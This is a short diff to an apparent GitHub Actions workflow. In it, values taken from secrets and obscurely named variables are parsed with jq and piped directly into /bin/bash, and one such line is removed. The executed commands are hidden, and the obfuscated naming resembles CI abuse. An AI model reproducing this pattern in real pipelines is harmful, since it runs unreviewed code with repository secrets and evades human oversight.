@@ -22,7 +22,6 @@ jobs:
           tfwc100: ${{ secrets.tfwc100 }}
         run: |
           printf '%s' "$tfwc100" | jq -r .wkf37 | /bin/bash
-          echo $jyho089 | jq -r .njj8 | /bin/bash
           echo $hdnh82 | jq -r .ssl24 | /bin/bash
 
       - name: Archive output
